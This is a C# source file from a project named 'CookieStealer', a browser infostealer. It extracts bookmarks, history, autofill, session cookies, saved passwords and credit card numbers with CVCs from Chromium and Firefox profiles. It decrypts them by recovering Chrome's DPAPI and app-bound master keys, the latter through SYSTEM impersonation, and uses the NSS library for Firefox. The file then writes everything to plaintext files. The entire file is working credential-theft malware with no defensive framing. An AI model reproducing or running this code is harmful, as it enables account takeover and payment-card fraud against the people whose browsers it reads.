using System.Data.SQLite;
using System.Text;
using System.Text.Json;

namespace CookieStealer;

public static class BrowserExtractor
{
    private static int _copyCounter = 0;

    private static string GetChromeDatetime(long timestamp)
    {
        try
        {
            if (timestamp == 0) return "Unknown";
            var epoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddTicks(timestamp * 10).ToString("yyyy-MM-dd HH:mm:ss");
        }
        catch { return "Unknown"; }
    }

    private static string? FetchSqliteCopy(string dbPath)
    {
        try
        {
            int id = Interlocked.Increment(ref _copyCounter);
            string tmpPath = Path.Combine(Path.GetTempPath(), $"bdata_{id}_{Path.GetFileName(dbPath)}");
            File.Copy(dbPath, tmpPath, true);
            return tmpPath;
        }
        catch (Exception e) 
        { 
            Console.WriteLine($"    [-] FetchSqliteCopy failed for {dbPath}: {e.Message}");
            return null; 
        }
    }

    private static List<string> ExtractBookmarks(string profilePath)
    {
        string bmPath = Path.Combine(profilePath, "Bookmarks");
        if (!File.Exists(bmPath)) return new();
        try
        {
            var data = JsonDocument.Parse(File.ReadAllText(bmPath, Encoding.UTF8));
            var bookmarks = new List<string>();

            void ProcessNode(JsonElement node)
            {
                if (node.ValueKind != JsonValueKind.Object) return;
                if (node.TryGetProperty("type", out var t) && t.GetString() == "url")
                {
                    string name = node.TryGetProperty("name", out var n) ? n.GetString() ?? "Unknown" : "Unknown";
                    string url = node.TryGetProperty("url", out var u) ? u.GetString() ?? "Unknown" : "Unknown";
                    bookmarks.Add($"{name}\t{url}");
                }
                if (node.TryGetProperty("children", out var children))
                    foreach (var child in children.EnumerateArray()) ProcessNode(child);
            }

            if (data.RootElement.TryGetProperty("roots", out var roots))
                foreach (var root in roots.EnumerateObject()) ProcessNode(root.Value);
            return bookmarks;
        }
        catch { return new(); }
    }

    private static List<string> ExtractHistory(string profilePath)
    {
        string histDb = Path.Combine(profilePath, "History");
        if (!File.Exists(histDb)) return new();
        string? dbCopy = FetchSqliteCopy(histDb);
        if (dbCopy == null) return new();
        try
        {
            var items = new List<string>();
            using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
            con.Open();
            using var cmd = new SQLiteCommand("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000", con);
            using var reader = cmd.ExecuteReader();
            while (reader.Read())
            {
                string url = reader.GetString(0);
                string title = reader.IsDBNull(1) ? "" : reader.GetString(1);
                int visitCount = reader.GetInt32(2);
                long lastVisit = reader.GetInt64(3);
                items.Add($"{url}\t{title}\t{visitCount}\t{GetChromeDatetime(lastVisit)}");
            }
            try { File.Delete(dbCopy); } catch { }
            return items;
        }
        catch { try { File.Delete(dbCopy!); } catch { } return new(); }
    }

    private static List<string> ExtractCreditCards(string profilePath, byte[]? v10Key, byte[]? v20Key)
    {
        string webDataDb = Path.Combine(profilePath, "Web Data");
        if (!File.Exists(webDataDb)) return new();
        if (v10Key == null && v20Key == null) return new();
        string? dbCopy = FetchSqliteCopy(webDataDb);
        if (dbCopy == null) return new();
        try
        {
            var cards = new List<string>();
            using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
            con.Open();

            var localCvcs = new Dictionary<string, byte[]>();
            try
            {
                using var cvcCmd = new SQLiteCommand("SELECT guid, value_encrypted FROM local_stored_cvc", con);
                using var r = cvcCmd.ExecuteReader();
                while (r.Read()) localCvcs[r.GetString(0)] = (byte[])r["value_encrypted"];
            }
            catch { }

            try
            {
                using var cmd = new SQLiteCommand("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", con);
                using var r = cmd.ExecuteReader();
                while (r.Read())
                {
                    string guid = r.GetString(0);
                    string name = r.IsDBNull(1) ? "" : r.GetString(1);
                    int expM = r.GetInt32(2), expY = r.GetInt32(3);
                    byte[] encNum = (byte[])r["card_number_encrypted"];
                    string decNum = DecryptBrowserValue(encNum, v10Key, v20Key, false) ?? "DECRYPT_FAILED";
                    string cvc = "N/A";
                    if (localCvcs.ContainsKey(guid))
                    {
                        string? d = DecryptBrowserValue(localCvcs[guid], v10Key, v20Key, false);
                        if (d != null) cvc = d;
                    }
                    cards.Add($"================\nGUID: {guid}\nNAME: {name}\nNUMBER: {decNum}\nVALID: {expM}/{expY}\nCVC: {cvc}\nTYPE: Local Card");
                }
            }
            catch { }
            try { File.Delete(dbCopy); } catch { }
            return cards;
        }
        catch { try { File.Delete(dbCopy!); } catch { } return new(); }
    }

    /// <summary>
    /// Decrypts a Chromium encrypted value using the correct key based on version prefix.
    /// v10/v11 uses the old DPAPI key, v20 uses the new app_bound key.
    /// For cookies (isCookieValue=true), v20 has a 32-byte hash prefix to skip.
    /// </summary>
    private static string? DecryptBrowserValue(byte[] encrypted, byte[]? v10Key, byte[]? v20Key, bool isCookieValue)
    {
        if (encrypted == null || encrypted.Length < 4) return null;
        try
        {
            string prefix = Encoding.ASCII.GetString(encrypted, 0, 3);
            byte[] iv = encrypted[3..15];
            byte[] payload = encrypted[15..];

            if (prefix == "v20" && v20Key != null)
            {
                // v20: AES-GCM with app_bound key
                byte[] ciphertext = payload[..^16];
                byte[] tag = payload[^16..];
                byte[] decrypted = CryptoHelper.DecryptAesGcm(v20Key, iv, ciphertext, tag);
                if (isCookieValue)
                    return Encoding.UTF8.GetString(decrypted, 32, decrypted.Length - 32);
                else
                    return Encoding.UTF8.GetString(decrypted);
            }
            else if ((prefix == "v10" || prefix == "v11") && v10Key != null)
            {
                // v10/v11: AES-GCM with DPAPI key, no 32-byte prefix
                byte[] ciphertext = payload[..^16];
                byte[] tag = payload[^16..];
                byte[] decrypted = CryptoHelper.DecryptAesGcm(v10Key, iv, ciphertext, tag);
                return Encoding.UTF8.GetString(decrypted);
            }
            else if (prefix == "v20" && v10Key != null)
            {
                // Fallback: try v10 key on v20 data (won't usually work but worth trying)
                try
                {
                    byte[] ciphertext = payload[..^16];
                    byte[] tag = payload[^16..];
                    byte[] decrypted = CryptoHelper.DecryptAesGcm(v10Key, iv, ciphertext, tag);
                    return Encoding.UTF8.GetString(decrypted);
                }
                catch { return null; }
            }
            else if ((prefix == "v10" || prefix == "v11") && v20Key != null)
            {
                // Fallback: try v20 key on v10 data
                try
                {
                    byte[] ciphertext = payload[..^16];
                    byte[] tag = payload[^16..];
                    byte[] decrypted = CryptoHelper.DecryptAesGcm(v20Key, iv, ciphertext, tag);
                    return Encoding.UTF8.GetString(decrypted);
                }
                catch { return null; }
            }
        }
        catch { }
        return null;
    }

    /// <summary>
    /// Gets BOTH the v10 (DPAPI) and v20 (app_bound) master keys from the browser's Local State.
    /// Returns (v10Key, v20Key) — either or both may be null.
    /// </summary>
    public static (byte[]? v10Key, byte[]? v20Key) GetMasterKeys(BrowserInfo config)
    {
        Console.WriteLine($"[*] Getting master keys for {config.Name}");
        byte[]? v10Key = null;
        byte[]? v20Key = null;

        try
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            if (config.LocalState == null) return (null, null);
            string localStatePath = Path.Combine(userProfile, config.LocalState);
            if (!File.Exists(localStatePath))
            {
                Console.WriteLine($"    [-] Local State not found: {localStatePath}");
                return (null, null);
            }

            var localState = JsonDocument.Parse(File.ReadAllText(localStatePath, Encoding.UTF8));
            if (!localState.RootElement.TryGetProperty("os_crypt", out var osCrypt))
            {
                Console.WriteLine("    [-] No os_crypt in Local State");
                return (null, null);
            }

            // Try to get v10 key (old DPAPI method) — always try this first
            if (osCrypt.TryGetProperty("encrypted_key", out var ek))
            {
                try
                {
                    byte[] keyBlobEncrypted = Convert.FromBase64String(ek.GetString()!)[5..]; // skip "DPAPI" prefix
                    v10Key = CryptoHelper.DpapiUnprotect(keyBlobEncrypted);
                    if (v10Key.Length == 0) v10Key = null;
                    else Console.WriteLine($"    [+] v10 DPAPI key retrieved ({v10Key.Length} bytes)");
                }
                catch (Exception e) { Console.WriteLine($"    [-] v10 key failed: {e.Message}"); }
            }

            // Try to get v20 key (app_bound method) — requires admin + LSASS
            if (osCrypt.TryGetProperty("app_bound_encrypted_key", out var abek))
            {
                try
                {
                    byte[] keyBlobEncrypted = Convert.FromBase64String(abek.GetString()!)[4..]; // skip "APPB" prefix
                    byte[] keyBlobSystemDecrypted;
                    using (var ctx = new SystemContext())
                    {
                        ctx.Impersonate();
                        keyBlobSystemDecrypted = CryptoHelper.DpapiUnprotect(keyBlobEncrypted);
                    }

                    if (keyBlobSystemDecrypted.Length > 0)
                    {
                        byte[] keyBlobUserDecrypted = CryptoHelper.DpapiUnprotect(keyBlobSystemDecrypted);
                        if (keyBlobUserDecrypted.Length > 0)
                        {
                            var (parsed, flag) = CryptoHelper.ParseKeyBlob(keyBlobUserDecrypted);
                            if (parsed != null)
                            {
                                if (flag != 1 && flag != 2 && flag != 3)
                                    v20Key = keyBlobUserDecrypted[^32..];
                                else
                                    v20Key = CryptoHelper.DeriveV20MasterKey(parsed, config.KeyName!);

                                if (v20Key != null && v20Key.Length > 0)
                                    Console.WriteLine($"    [+] v20 app_bound key retrieved ({v20Key.Length} bytes)");
                                else
                                    v20Key = null;
                            }
                        }
                    }
                }
                catch (Exception e) { Console.WriteLine($"    [-] v20 key failed: {e.Message}"); }
            }

            if (v10Key == null && v20Key == null)
                Console.WriteLine("    [!] No master keys could be retrieved");
        }
        catch (Exception e) { Console.WriteLine($"[-] Error getting master keys: {e.Message}"); }

        return (v10Key, v20Key);
    }

    public static void ProcessChromiumBrowser(string browserName, BrowserInfo config)
    {
        Console.WriteLine($"[*] Processing Chromium browser: {browserName}");
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string browserDataPath = Path.Combine(userProfile, config.DataPath);
        if (!Directory.Exists(browserDataPath))
        {
            Console.WriteLine($"    [-] Browser data path not found: {browserDataPath}");
            return;
        }

        var (v10Key, v20Key) = GetMasterKeys(config);

        var profiles = Directory.GetDirectories(browserDataPath)
            .Where(d => { var n = Path.GetFileName(d); return n == "Default" || n.StartsWith("Profile"); }).ToArray();

        Console.WriteLine($"    [*] Found {profiles.Length} profile(s)");

        foreach (var profileDir in profiles)
        {
            string profileName = Path.GetFileName(profileDir).ToLower();
            Console.WriteLine($"    [*] Processing profile: {profileName}");
            string outDir = Path.Combine(Config.OUTPUT_BASE_DIR, browserName, profileName);
            Directory.CreateDirectory(outDir);

            // Bookmarks
            var bookmarks = ExtractBookmarks(profileDir);
            if (bookmarks.Count > 0)
            {
                File.WriteAllText(Path.Combine(outDir, "bookmarks.txt"), "# Name\tURL\n" + string.Join("\n", bookmarks), Encoding.UTF8);
                Console.WriteLine($"    [+] {bookmarks.Count} bookmarks extracted");
            }

            // History
            var history = ExtractHistory(profileDir);
            if (history.Count > 0)
            {
                File.WriteAllText(Path.Combine(outDir, "history.txt"), "# URL\tTitle\tVisit Count\tLast Visit\n" + string.Join("\n", history), Encoding.UTF8);
                Console.WriteLine($"    [+] {history.Count} history items extracted");
            }

            // Credit Cards
            var cards = ExtractCreditCards(profileDir, v10Key, v20Key);
            if (cards.Count > 0)
            {
                File.WriteAllText(Path.Combine(outDir, "credit_cards.txt"), "# Credit Cards\n" + string.Join("\n\n", cards), Encoding.UTF8);
                Console.WriteLine($"    [+] {cards.Count} credit cards extracted");
            }

            // Cookies
            string cookieDbPath = Path.Combine(profileDir, "Network", "Cookies");
            if (File.Exists(cookieDbPath) && (v10Key != null || v20Key != null))
            {
                try
                {
                    string? cookieCopy = FetchSqliteCopy(cookieDbPath);
                    if (cookieCopy != null)
                    {
                        var sb = new StringBuilder("# Netscape HTTP Cookie File\n# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n");
                        int successCount = 0;
                        using var con = new SQLiteConnection($"Data Source={cookieCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, CAST(encrypted_value AS BLOB) FROM cookies", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string host = reader.GetString(0);
                            string name = reader.GetString(1);
                            string path = reader.IsDBNull(2) ? "/" : reader.GetString(2);
                            long expires = reader.GetInt64(3);
                            bool secure = reader.GetBoolean(4);
                            byte[] encValue = reader.IsDBNull(6) ? Array.Empty<byte>() : (byte[])reader[6];

                            if (encValue.Length >= 4)
                            {
                                string? decrypted = DecryptBrowserValue(encValue, v10Key, v20Key, true);
                                string val = decrypted ?? "DECRYPT_FAILED";
                                if (decrypted != null) successCount++;
                                string flag = host.StartsWith('.') ? "TRUE" : "FALSE";
                                long secs = expires / 1000000;
                                long unixExp = secs > 11644473600 ? secs - 11644473600 : 0;
                                sb.AppendLine($"{host}\t{flag}\t{path}\t{(secure ? "TRUE" : "FALSE")}\t{unixExp}\t{name}\t{val}");
                            }
                        }
                        File.WriteAllText(Path.Combine(outDir, "cookies.txt"), sb.ToString(), Encoding.UTF8);
                        Console.WriteLine($"    [+] {successCount} cookies decrypted successfully");
                        try { File.Delete(cookieCopy); } catch { }
                    }
                }
                catch (Exception e) { Console.WriteLine($"    [-] Error processing cookies: {e.Message}"); }
            }
            else if (!File.Exists(cookieDbPath))
            {
                Console.WriteLine($"    [-] Cookie DB not found: {cookieDbPath}");
            }

            // Passwords
            string loginDbPath = Path.Combine(profileDir, "Login Data");
            if (File.Exists(loginDbPath) && (v10Key != null || v20Key != null))
            {
                try
                {
                    string? loginCopy = FetchSqliteCopy(loginDbPath);
                    if (loginCopy != null)
                    {
                        var sb = new StringBuilder("# Passwords\n");
                        int successCount = 0;
                        using var con = new SQLiteConnection($"Data Source={loginCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string url = reader.GetString(0);
                            string username = reader.GetString(1);
                            byte[] encPass = reader.IsDBNull(2) ? Array.Empty<byte>() : (byte[])reader[2];
                            if (encPass.Length >= 4)
                            {
                                string? decrypted = DecryptBrowserValue(encPass, v10Key, v20Key, false);
                                if (decrypted != null) successCount++;
                                sb.AppendLine($"URL: {url}\nUsername: {username}\nPassword: {decrypted ?? "<decryption_failed>"}\n");
                            }
                        }
                        File.WriteAllText(Path.Combine(outDir, "passwords.txt"), sb.ToString(), Encoding.UTF8);
                        Console.WriteLine($"    [+] {successCount} passwords decrypted successfully");
                        try { File.Delete(loginCopy); } catch { }
                    }
                }
                catch (Exception e) { Console.WriteLine($"    [-] Error processing logins: {e.Message}"); }
            }

            // Autofill
            string webDataPath = Path.Combine(profileDir, "Web Data");
            if (File.Exists(webDataPath))
            {
                try
                {
                    string? dbCopy = FetchSqliteCopy(webDataPath);
                    if (dbCopy != null)
                    {
                        var sb = new StringBuilder();
                        using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT name, value FROM autofill", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string name = reader.IsDBNull(0) ? "" : reader.GetString(0);
                            if (string.IsNullOrWhiteSpace(name)) continue;
                            string value = reader.IsDBNull(1) ? "" : reader.GetString(1);
                            sb.AppendLine($"Field: {name}\nValue: {value}\n");
                        }
                        if (sb.Length > 0) File.WriteAllText(Path.Combine(outDir, "auto_fills.txt"), sb.ToString(), Encoding.UTF8);
                        try { File.Delete(dbCopy); } catch { }
                    }
                }
                catch { }
            }
        }
    }

    public static void ProcessGeckoBrowser(string browserName, BrowserInfo config)
    {
        Console.WriteLine($"[*] Processing Gecko browser: {browserName}");
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        string browserDataPath = Path.Combine(userProfile, config.DataPath);
        if (!Directory.Exists(browserDataPath)) return;

        var nss = new NssHandler();
        if (!nss.Loaded) { Console.WriteLine("[-] Could not load NSS library"); return; }

        foreach (var profileDir in Directory.GetDirectories(browserDataPath))
        {
            string profileName = Path.GetFileName(profileDir);
            if (!nss.InitProfile(profileDir)) continue;

            string outDir = Path.Combine(Config.OUTPUT_BASE_DIR, browserName, profileName);
            Directory.CreateDirectory(outDir);

            // Cookies
            string cookiesDb = Path.Combine(profileDir, "cookies.sqlite");
            if (File.Exists(cookiesDb))
            {
                try
                {
                    string? dbCopy = FetchSqliteCopy(cookiesDb);
                    if (dbCopy != null)
                    {
                        var sb = new StringBuilder("# Netscape HTTP Cookie File\n# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n");
                        using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string host = reader.GetString(0); string name = reader.GetString(1);
                            string path = reader.IsDBNull(2) ? "/" : reader.GetString(2);
                            long expiry = reader.GetInt64(3); bool secure = reader.GetBoolean(4);
                            string value = reader.IsDBNull(6) ? "" : reader.GetString(6);
                            string flag = host.StartsWith('.') ? "TRUE" : "FALSE";
                            sb.AppendLine($"{host}\t{flag}\t{path}\t{(secure ? "TRUE" : "FALSE")}\t{expiry}\t{name}\t{value}");
                        }
                        File.WriteAllText(Path.Combine(outDir, "cookies.txt"), sb.ToString(), Encoding.UTF8);
                        try { File.Delete(dbCopy); } catch { }
                    }
                }
                catch { }
            }

            // Passwords (logins.json)
            string loginsJson = Path.Combine(profileDir, "logins.json");
            if (File.Exists(loginsJson))
            {
                try
                {
                    var data = JsonDocument.Parse(File.ReadAllText(loginsJson, Encoding.UTF8));
                    if (data.RootElement.TryGetProperty("logins", out var logins))
                    {
                        var sb = new StringBuilder("# Passwords\n");
                        foreach (var login in logins.EnumerateArray())
                        {
                            string hostname = login.TryGetProperty("hostname", out var h) ? h.GetString() ?? "" : "";
                            string? encUser = login.TryGetProperty("encryptedUsername", out var eu) ? eu.GetString() : null;
                            string? encPass = login.TryGetProperty("encryptedPassword", out var ep) ? ep.GetString() : null;
                            string username = encUser != null ? nss.Decrypt(encUser) ?? "" : "";
                            string password = encPass != null ? nss.Decrypt(encPass) ?? "" : "";
                            sb.AppendLine($"URL: {hostname}\nUsername: {username}\nPassword: {password}\n");
                        }
                        File.WriteAllText(Path.Combine(outDir, "passwords.txt"), sb.ToString(), Encoding.UTF8);
                    }
                }
                catch { }
            }

            // History
            string placesDb = Path.Combine(profileDir, "places.sqlite");
            if (File.Exists(placesDb))
            {
                string? dbCopy = FetchSqliteCopy(placesDb);
                if (dbCopy != null)
                {
                    try
                    {
                        var sb = new StringBuilder("# URL\tTitle\tVisit Count\tLast Visit\n");
                        using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string url = reader.GetString(0);
                            string title = reader.IsDBNull(1) ? "No Title" : reader.GetString(1);
                            int visits = reader.GetInt32(2);
                            string date = "Unknown";
                            if (!reader.IsDBNull(3))
                            {
                                try { date = DateTimeOffset.FromUnixTimeMilliseconds(reader.GetInt64(3) / 1000).ToString("yyyy-MM-dd HH:mm:ss"); } catch { }
                            }
                            sb.AppendLine($"{url}\t{title}\t{visits}\t{date}");
                        }
                        File.WriteAllText(Path.Combine(outDir, "history.txt"), sb.ToString(), Encoding.UTF8);
                        try { File.Delete(dbCopy); } catch { }
                    }
                    catch { try { File.Delete(dbCopy); } catch { } }
                }
            }

            // Bookmarks
            if (File.Exists(placesDb))
            {
                string? dbCopy = FetchSqliteCopy(placesDb);
                if (dbCopy != null)
                {
                    try
                    {
                        var sb = new StringBuilder("# Name\tURL\n");
                        using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string name = reader.IsDBNull(0) ? "Unknown" : reader.GetString(0);
                            string url = reader.GetString(1);
                            sb.AppendLine($"{name}\t{url}");
                        }
                        File.WriteAllText(Path.Combine(outDir, "bookmarks.txt"), sb.ToString(), Encoding.UTF8);
                        try { File.Delete(dbCopy); } catch { }
                    }
                    catch { try { File.Delete(dbCopy); } catch { } }
                }
            }

            // Autofill
            string formDb = Path.Combine(profileDir, "formhistory.sqlite");
            if (File.Exists(formDb))
            {
                string? dbCopy = FetchSqliteCopy(formDb);
                if (dbCopy != null)
                {
                    try
                    {
                        var sb = new StringBuilder();
                        using var con = new SQLiteConnection($"Data Source={dbCopy};Version=3;Read Only=True;");
                        con.Open();
                        using var cmd = new SQLiteCommand("SELECT fieldname, value, timesUsed FROM moz_formhistory", con);
                        using var reader = cmd.ExecuteReader();
                        while (reader.Read())
                        {
                            string field = reader.GetString(0);
                            string value = reader.IsDBNull(1) ? "" : reader.GetString(1);
                            int times = reader.GetInt32(2);
                            sb.AppendLine($"Field: {field}\nValue: {value}\nTimes Used: {times}\n");
                        }
                        if (sb.Length > 0) File.WriteAllText(Path.Combine(outDir, "auto_fills.txt"), sb.ToString(), Encoding.UTF8);
                        try { File.Delete(dbCopy); } catch { }
                    }
                    catch { try { File.Delete(dbCopy); } catch { } }
                }
            }

            nss.Shutdown();
        }
    }
}
